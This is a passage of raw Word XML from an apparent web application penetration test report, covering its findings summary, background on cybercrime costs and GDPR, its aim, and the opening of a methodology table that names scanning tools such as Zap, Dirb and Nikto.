        <w:t xml:space="preserve">clear and concise information ensuring as many possible solutions are considered and proposed.  However, </w:t>
      </w:r>
      <w:r w:rsidR="00422359" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>it should be recognised</w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> a report can only go so far</w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> to protect a system and works best when used as part of a greater security plan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BA188F" w14:textId="38AA1E67" w:rsidR="004816C4" w:rsidRPr="00292DEC" w:rsidRDefault="00CD6D8F" w:rsidP="00DA638E">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>After carefully analysing the findings of the report, it becomes clear that this website is critically flawed</w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>vulnerabilities found in all the key functions</w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> and sensitive areas of the website easily accessed. Limited effort seems to have been made to secure this web application, with flaws present that should be obvious to someone with a basic understanding of computer security. Recommendations have been given in specific instances as to steps that should be taken to mitigate these risks, however, the scope of the problem cannot be understated. </w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">It </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">therefore </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">recommended that consideration be given to the reconstruction of the website </w:t>
      </w:r>
      <w:r w:rsidR="002775F5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>from the ground up.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC47BA1" w14:textId="07F2ABC0" w:rsidR="00341658" w:rsidRDefault="00341658" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Background</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="08C7ADAD" w14:textId="77777777" w:rsidR="00F1643D" w:rsidRDefault="00AE4FCB" w:rsidP="004D7B3D">
      <w:pPr>
        <w:spacing w:after="200"/>
        <w:ind w:left="19" w:right="919"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="10A8B512" wp14:editId="3337242B">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>2049780</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>788035</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3622675" cy="2201545"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>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PNG"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3622675" cy="2201545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="margin">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="margin">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00F06A63">
        <w:t xml:space="preserve">This report will look at a web application to find all potential vulnerabilities. This sort of work is important as MANY websites contain severe vulnerabilities that could be used to </w:t>
      </w:r>
      <w:r w:rsidR="00C07829">
        <w:t xml:space="preserve">compromise those systems. </w:t>
      </w:r>
      <w:r w:rsidR="0084334E">
        <w:t>As can be seen in the Figure below there are 22 vulnerabilities on average in any given web application</w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(ptsecurity, 2020)</w:t>
      </w:r>
      <w:r w:rsidR="0084334E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00C07829">
        <w:t xml:space="preserve">This is of significant concern as Cybercrime is estimated to have cost the world economy </w:t>
      </w:r>
      <w:r w:rsidR="00C07829" w:rsidRPr="00C07829">
        <w:t>$</w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00C07829" w:rsidRPr="00C07829">
        <w:t xml:space="preserve"> trillion b</w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:t xml:space="preserve">etween 2018 and 2020 alone </w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Malekos Smith, Lostri and A. Lewis, 2020)</w:t>
      </w:r>
      <w:r w:rsidR="00C07829" w:rsidRPr="00C07829">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C07829">
        <w:t xml:space="preserve"> This is why it is vital to constantly be vigilant when creating web applications, and also, to </w:t>
      </w:r>
      <w:r w:rsidR="0043444F">
        <w:t>perform</w:t>
      </w:r>
      <w:r w:rsidR="00C07829">
        <w:t xml:space="preserve"> these sort of evaluative test to ensure the greatest level of security possible.</w:t>
      </w:r>
      <w:r w:rsidR="00FC1532">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5E85AF" w14:textId="77777777" w:rsidR="00FC1532" w:rsidRDefault="00FC1532" w:rsidP="000368E0"/>
    <w:p w14:paraId="4FF2CBC7" w14:textId="492AAE11" w:rsidR="00022497" w:rsidRDefault="00C07829" w:rsidP="00022497">
      <w:pPr>
        <w:spacing w:after="200"/>
        <w:ind w:left="19" w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unfortunately, according to </w:t>
      </w:r>
      <w:r w:rsidR="00F665CB">
        <w:t>a poll by WebARX</w:t>
      </w:r>
      <w:r w:rsidR="00201E44">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F665CB">
        <w:t>73%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of black hat hackers believe firewalls and security suites are irrelevant</w:t>
      </w:r>
      <w:r w:rsidR="001E4163">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B61049">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Talalaev, 2020)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This is because most firewalls and security software is most effective at preventing automated bots from finding and exploiting vulnerabilities in the website configuration. A dedicated hacker would likely be able to gain access regardless of the precautions put in place. That is why this report aims to be as through and meticulous as possible so as to remove as many vectors of attack , eliminating the concern of automated attacks. </w:t>
      </w:r>
      <w:r w:rsidR="00DD35BE">
        <w:t>It will also seek to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> delay a malicious user long enough for them to be detected on the network and be removed.</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0043444F">
        <w:t>Unfortunately</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t>, attacker</w:t>
      </w:r>
      <w:r w:rsidR="00201E44">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t xml:space="preserve"> can be highly motivated by the monetary gains that accessing a system can grant. It is estimated that a sale of credit and debit cards can earn a hacker “between £89,000 and £355,000” </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Stuttard, Pinto and Pauli, 2012).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0564A2D6" w14:textId="77777777" w:rsidR="00022497" w:rsidRDefault="00022497" w:rsidP="00022497">
      <w:pPr>
        <w:spacing w:after="200"/>
        <w:ind w:left="19" w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="556A038C" w14:textId="715D2178" w:rsidR="00D520B1" w:rsidRDefault="00D520B1" w:rsidP="004D7B3D">
      <w:pPr>
        <w:spacing w:after="200"/>
        <w:ind w:left="19" w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t>When looking specifically at th</w:t>
      </w:r>
      <w:r w:rsidR="00DD35BE">
        <w:t>e client</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> website it is </w:t>
      </w:r>
      <w:r w:rsidR="00DD35BE">
        <w:t xml:space="preserve">vital </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to understand why good security is important. Because this website stores user details it must conform to GDPR. </w:t>
      </w:r>
      <w:r w:rsidR="00201E44">
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:t>it fails to do so</w:t>
      </w:r>
      <w:r w:rsidR="00201E44">
        <w:t xml:space="preserve"> appropriately,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it could face fines from the Information Commissioner of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>€</w:t>
      </w:r>
      <w:r>
        <w:t>10 million or 2% of yearly turnover, whichever is higher</w:t>
      </w:r>
      <w:r w:rsidRPr="00D520B1">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(Penalties, 2020)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. However not all impacts are so easily </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t xml:space="preserve">quantifiable. According to research done by the Home Office </w:t>
      </w:r>
      <w:r>
        <w:t>“A ‘good’ reputation did not rely on never making mistakes”</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t xml:space="preserve">This shows that customers are willing to forgive companies, however, it also found that customers wanted companies to </w:t>
      </w:r>
      <w:r>
        <w:t>“take responsibility for any errors</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B" w:rsidRPr="00BD6E1B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> swiftly offer solutions”</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B" w:rsidRPr="00BD6E1B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Stuttard, Pinto and Pauli, 2012)</w:t>
      </w:r>
      <w:r w:rsidR="00BD6E1B">
        <w:t>. This suggests that customers desire action in order to assuage fears. Which is why this report will be valuable in saving, not only millions in costs, but potentially a significant amount of the company’s reputation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F16FA3C" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="004D7B3D" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc58836563"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Aim</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="0F8AAA9D" w14:textId="77777777" w:rsidR="00C07829" w:rsidRDefault="005A1C80" w:rsidP="004D7B3D">
      <w:pPr>
        <w:spacing w:after="200"/>
        <w:ind w:left="19" w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t>To completely secure the website is unlikely. By its very nature it needs to be accessible. That is why t</w:t>
      </w:r>
      <w:r w:rsidR="004262F0">
        <w:t xml:space="preserve">his project </w:t>
      </w:r>
      <w:r>
        <w:t>seeks to</w:t>
      </w:r>
      <w:r w:rsidR="004262F0">
        <w:t xml:space="preserve"> follow a clear process when carrying out a web application penetration test in order to definitively show areas of vulnerability and provide substantial evidence to support </w:t>
      </w:r>
      <w:r>
        <w:t>any conclusions</w:t>
      </w:r>
      <w:r w:rsidR="004262F0">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="008C5452" w:rsidRPr="008C5452">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C00234" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc58836564"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="4221756F" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="00257FFB">
      <w:pPr>
        <w:pStyle w:val="Abtracttitle"/>
      </w:pPr>
      <w:r>
        <w:t>Overview of Procedure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A2F66C" w14:textId="77777777" w:rsidR="00CD4824" w:rsidRDefault="004E1DF5" w:rsidP="00AC0458">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>This methodology was</w:t>
      </w:r>
      <w:r w:rsidR="00044497">
        <w:t xml:space="preserve"> created based on the </w:t>
      </w:r>
      <w:r w:rsidR="00044497" w:rsidRPr="00BF3571">
        <w:t>web hackers handbook</w:t>
      </w:r>
      <w:r w:rsidR="00BF3571" w:rsidRPr="00BF3571">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3571">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Stuttard, Pinto and Pauli, 2012)</w:t>
      </w:r>
      <w:r w:rsidR="00044497">
        <w:t xml:space="preserve">. However, it has been </w:t>
      </w:r>
      <w:r w:rsidR="00D625DC">
        <w:t>heavily</w:t>
      </w:r>
      <w:r w:rsidR="00044497">
        <w:t xml:space="preserve"> modified in order to </w:t>
      </w:r>
      <w:r w:rsidR="00D625DC">
        <w:t xml:space="preserve">better reflect the technologies present in this web application. This mainly consists of removing sections that are not relevant to this </w:t>
      </w:r>
      <w:r w:rsidR="00514AB7">
        <w:t>report. Relevant tools will be listed in sections where specific tools where used. Note that some sections may reference results obtained in previous sections or include general observations and therefore have no tools specified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED45192" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F" w:rsidP="00AC0458">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="724A1AB0" w14:textId="77777777" w:rsidR="00CD4824" w:rsidRPr="00ED3CCF" w:rsidRDefault="00CD4824" w:rsidP="001E0E25">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3CCF">
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Enumerating Website</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9428" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="142"/>
        <w:gridCol w:w="141"/>
        <w:gridCol w:w="1228"/>
        <w:gridCol w:w="3411"/>
        <w:gridCol w:w="3445"/>
        <w:gridCol w:w="1061"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A32E1E" w14:paraId="1D84BD2E" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1511" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="1FEECB2C" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="26F52CEE" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="26C9670D" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Relevant Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="1783273B" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Appendix</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="62ECD3A2" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1511" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="085A50C7" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0BD98537" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Map application content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="32D834D2" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
            <w:r w:rsidR="00C857C5">
              <w:t>, Dirb, Nikto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="2B6F2BB7" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="5C8ACBFF" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="142" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1369" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="327FEAFC" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7066860F" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Linked content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2831D65A" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00C857C5" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1AF8F990" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A32E1E" w14:paraId="70D42204" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="283" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1228" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="53C0E8CD" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3411" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2AAFE148" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRPr="005A1C80" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Explore visible content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3445" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="386254B5" w14:textId="77777777" w:rsidR="00A32E1E" w:rsidRDefault="00A32E1E" w:rsidP="001E0E25">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1061" w:type="dxa"/>
